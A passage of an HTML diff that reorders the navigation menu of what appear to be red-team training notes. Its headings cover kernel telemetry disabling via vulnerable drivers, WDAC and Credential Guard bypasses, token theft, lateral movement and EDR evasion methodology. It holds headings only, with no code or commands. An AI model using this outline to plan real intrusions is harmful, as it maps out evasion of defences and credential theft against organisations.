         </button>
         <div class="nested-dropdown-container">
-          <a href="#crtl-lateral-make-token-createnetonly">6.1.1 make_token / createnetonly</a>
-          <a href="#crtl-lateral-steal-token">6.1.2 steal_token</a>
-          <a href="#crtl-lateral-kerberos">6.1.3 Kerberos</a>
+          <a href="#crtl-vulndrv-suspicious-ntoskrnl-image-loads">6.2.1 Suspicious ntoskrnl image loads</a>
         </div>
       </div>
+      <a href="#crtl-vulndrv-disabling-kernel-telemetry">6.3 Disabling Kernel Telemetry</a>
+      <a href="#crtl-vulndrv-kernel-callbacks">6.4 Kernel callbacks</a>
+      <a href="#crtl-vulndrv-etw-ti">6.5 ETW-TI</a>
+      <a href="#crtl-vulndrv-protected-processes">6.6 Protected Processes</a>
+    </div>
+  </div><div class="section-flow-7">
+    <button class="dropdown-btn">7. WDAC Bypass 
+      <i class="bi bi-caret-down-fill"></i>
+    </button>
+    <div class="dropdown-container">
+      <a href="#crtl-appcontrol-app-control-policies">7.1 App Control policies</a>
+      <a href="#crtl-appcontrol-wdactools">7.2 WDACTools</a>
       <div class="nested-dropdown">
-        <button class="nested-dropdown-btn">6.2 Lateral Movement
+        <button class="nested-dropdown-btn">7.3 Rule options
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#crtl-lateral-wmi">6.2.1 WMI</a>
-          <a href="#crtl-lateral-psexec">6.2.2 PsExec</a>
+          <a href="#crtl-appcontrol-audit-mode">7.3.1 Audit Mode</a>
+          <a href="#crtl-appcontrol-umci">7.3.2 UMCI</a>
+          <a href="#crtl-appcontrol-unsigned-system-integrity-policy">7.3.3 Unsigned System Integrity Policy</a>
+          <a href="#crtl-appcontrol-update-policy-no-reboot">7.3.4 Update Policy No Reboot</a>
+          <a href="#crtl-appcontrol-runtime-filepath-rule-protection">7.3.5 Runtime FilePath Rule Protection</a>
+          <a href="#crtl-appcontrol-dynamic-code-security">7.3.6 Dynamic Code Security</a>
         </div>
       </div>
-      <a href="#crtl-lateral-beacon-rdll-generate-local">6.3 BEACON_RDLL_GENERATE_LOCAL</a>
-    </div>
-  </div>
-  <div class="section-flow-7">
-    <button class="dropdown-btn">7. Vulnerable Drivers
-      <i class="bi bi-caret-down-fill"></i>
-    </button>
-    <div class="dropdown-container">
-      <a href="#crtl-vulndrv-rtcore64">7.1 RTCore64</a>
+      <a href="#crtl-appcontrol-default-signers-and-ekus">7.4 Default signers and EKUs</a>
+      <a href="#crtl-appcontrol-supplemental-policies">7.5 Supplemental policies</a>
+      <a href="#crtl-appcontrol-deny-rules">7.6 Deny rules</a>
+      <a href="#crtl-appcontrol-policy-misconfigurations">7.7 Policy Misconfigurations</a>
+      <a href="#crtl-appcontrol-audit-only-policies">7.8 Audit-only policies</a>
+      <a href="#crtl-appcontrol-file-attributes">7.9 File attributes</a>
+      <a href="#crtl-appcontrol-path-wildcards">7.10 Path wildcards</a>
       <div class="nested-dropdown">
-        <button class="nested-dropdown-btn">7.2 Driver BOFs
+        <button class="nested-dropdown-btn">7.11 Living Off The Land
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#crtl-vulndrv-suspicious-ntoskrnl-image-loads">7.2.1 Suspicious ntoskrnl image loads</a>
+          <a href="#crtl-appcontrol-electron">7.11.1 Electron</a>
         </div>
       </div>
-      <a href="#crtl-vulndrv-disabling-kernel-telemetry">7.3 Disabling Kernel Telemetry</a>
-      <a href="#crtl-vulndrv-kernel-callbacks">7.4 Kernel callbacks</a>
-      <a href="#crtl-vulndrv-etw-ti">7.5 ETW-TI</a>
-      <a href="#crtl-vulndrv-protected-processes">7.6 Protected Processes</a>
+      <a href="#crtl-appcontrol-trusted-cas">7.12 Trusted CAs</a>
+      <a href="#crtl-appcontrol-weaponising-app-control">7.13 Weaponising App Control</a>
+      <a href="#crtl-appcontrol-supplemental-policies-2">7.14 Supplemental policies</a>
+      <a href="#crtl-appcontrol-deny-only-base-policies">7.15 Deny-only base policies</a>
     </div>
-  </div>
-  <div class="section-flow-8">
-    <button class="dropdown-btn">8. App Control for Business
+  </div><div class="section-flow-8">
+    <button class="dropdown-btn">8. Credential Guard Bypass 
       <i class="bi bi-caret-down-fill"></i>
     </button>
     <div class="dropdown-container">
-      <a href="#crtl-appcontrol-app-control-policies">8.1 App Control policies</a>
-      <a href="#crtl-appcontrol-wdactools">8.2 WDACTools</a>
-      <div class="nested-dropdown">
-        <button class="nested-dropdown-btn">8.3 Rule options
-          <i class="bi bi-caret-down-fill"></i>
-        </button>
-        <div class="nested-dropdown-container">
-          <a href="#crtl-appcontrol-audit-mode">8.3.1 Audit Mode</a>
-          <a href="#crtl-appcontrol-umci">8.3.2 UMCI</a>
-          <a href="#crtl-appcontrol-unsigned-system-integrity-policy">8.3.3 Unsigned System Integrity Policy</a>
-          <a href="#crtl-appcontrol-update-policy-no-reboot">8.3.4 Update Policy No Reboot</a>
-          <a href="#crtl-appcontrol-runtime-filepath-rule-protection">8.3.5 Runtime FilePath Rule Protection</a>
-          <a href="#crtl-appcontrol-dynamic-code-security">8.3.6 Dynamic Code Security</a>
-        </div>
+      <a href="#crtl-cg-secrets">8.1 Credential Guard Secrets</a>
+      <a href="#crtl-cg-no-tgts">8.2 No TGTs for You</a>
+      <a href="#crtl-cg-service-tickets">8.3 Extracting Service Tickets</a>
+      <a href="#crtl-cg-plaintext-tgt">8.4 TGTs from Plaintext Password</a>
+      <a href="#crtl-cg-pkinit">8.5 PKINIT Certificates</a>
+    </div>
+  </div><div class="section-flow-9">
+    <button class="dropdown-btn">9. User Impersonation 
+      <i class="bi bi-caret-down-fill"></i>
+    </button>
+    <div class="dropdown-container">
+        <a href="#crtl-lateral-make-token-createnetonly">9.1 make_token / createnetonly</a>
+        <a href="#crtl-lateral-steal-token">9.2 steal_token</a>
+        <a href="#crtl-lateral-kerberos">9.3 Kerberos</a>
       </div>
-      <a href="#crtl-appcontrol-default-signers-and-ekus">8.4 Default signers and EKUs</a>
-      <a href="#crtl-appcontrol-supplemental-policies">8.5 Supplemental policies</a>
-      <a href="#crtl-appcontrol-deny-rules">8.6 Deny rules</a>
-      <a href="#crtl-appcontrol-policy-misconfigurations">8.7 Policy Misconfigurations</a>
-      <a href="#crtl-appcontrol-audit-only-policies">8.8 Audit-only policies</a>
-      <a href="#crtl-appcontrol-file-attributes">8.9 File attributes</a>
-      <a href="#crtl-appcontrol-path-wildcards">8.10 Path wildcards</a>
-      <div class="nested-dropdown">
-        <button class="nested-dropdown-btn">8.11 Living Off The Land
-          <i class="bi bi-caret-down-fill"></i>
-        </button>
-        <div class="nested-dropdown-container">
-          <a href="#crtl-appcontrol-electron">8.11.1 Electron</a>
-        </div>
+    </div><div class="section-flow-10">
+      <button class="dropdown-btn">10. Lateral Movement <i class="bi bi-caret-down-fill"></i></button>
+      <div class="dropdown-container">
+        <a href="#crtl-lateral-wmi">10.1 WMI</a>
+        <a href="#crtl-lateral-psexec">10.2 PsExec</a>
+        <a href="#crtl-lateral-beacon-rdll-generate-local">10.3 BEACON_RDLL_GENERATE_LOCAL</a>
       </div>
-      <a href="#crtl-appcontrol-trusted-cas">8.12 Trusted CAs</a>
-      <a href="#crtl-appcontrol-weaponising-app-control">8.13 Weaponising App Control</a>
-      <a href="#crtl-appcontrol-supplemental-policies-2">8.14 Supplemental policies</a>
-      <a href="#crtl-appcontrol-deny-only-base-policies">8.15 Deny-only base policies</a>
-    </div>
-  </div>
-  <div class="section-flow-9">
-    <button class="dropdown-btn">9. Credential Guard
+    </div><div class="section-flow-11">
+    <button class="dropdown-btn">11. Methodology
       <i class="bi bi-caret-down-fill"></i>
     </button>
     <div class="dropdown-container">
-      <a href="#crtl-cg-secrets">9.1 Credential Guard Secrets</a>
-      <a href="#crtl-cg-no-tgts">9.2 No TGTs for You</a>
-      <a href="#crtl-cg-service-tickets">9.3 Extracting Service Tickets</a>
-      <a href="#crtl-cg-plaintext-tgt">9.4 TGTs from Plaintext Password</a>
-      <a href="#crtl-cg-pkinit">9.5 PKINIT Certificates</a>
+      <a href="#methodology-c2-infra">11.1 C2 Infrastructure</a>
+      <a href="#methodology-edr-telemetry">11.2 EDR Telemetry Understanding</a>
+      <a href="#methodology-load-time">11.3 Load-Time Evasion</a>
+      <a href="#methodology-runtime">11.4 Runtime Evasion</a>
+      <a href="#methodology-postex">11.5 Post-Exploitation Evasion</a>
+      <a href="#methodology-kernel-bypass">11.6 Kernel-Mode Bypasses</a>
+      <a href="#methodology-wdac">11.7 WDAC Bypass</a>
+      <a href="#methodology-cred-access">11.8 Credential Access Under Protection</a>
+      <a href="#methodology-impersonation">11.9 User Impersonation</a>
+      <a href="#methodology-lateral-movement">11.10 Lateral Movement</a>
     </div>
-  </div>
-  <div class="section-flow-10">
-    <button class="dropdown-btn">10. Methodology
+  </div><div class="section-flow-12">
+    <button class="dropdown-btn">12. References
       <i class="bi bi-caret-down-fill"></i>
     </button>
     <div class="dropdown-container">
-      <a href="#methodology-recon">10.1 Defender Recon</a>
-      <a href="#methodology-loader">10.2 Load-Time Evasion (Loader Build)</a>
-      <a href="#methodology-runtime">10.3 Runtime Evasion</a>
-      <a href="#methodology-postex">10.4 Post-Exploitation Evasion</a>
-      <a href="#methodology-lateral">10.5 User Impersonation &amp; Lateral Movement</a>
-      <a href="#methodology-kernel">10.6 Kernel-Resident Telemetry Disabling</a>
-      <a href="#methodology-appcontrol">10.7 App Control / WDAC Bypass</a>
-      <a href="#methodology-credguard">10.8 Credential Guard &amp; Credential Theft</a>
-    </div>
-  </div>
-  <div class="section-flow-11">
-    <button class="dropdown-btn">11. References
-      <i class="bi bi-caret-down-fill"></i>
-    </button>
-    <div class="dropdown-container">
-      <a href="#references">11. References</a>
+      <a href="#references">12. References</a>
     </div>
   </div>
 </div>
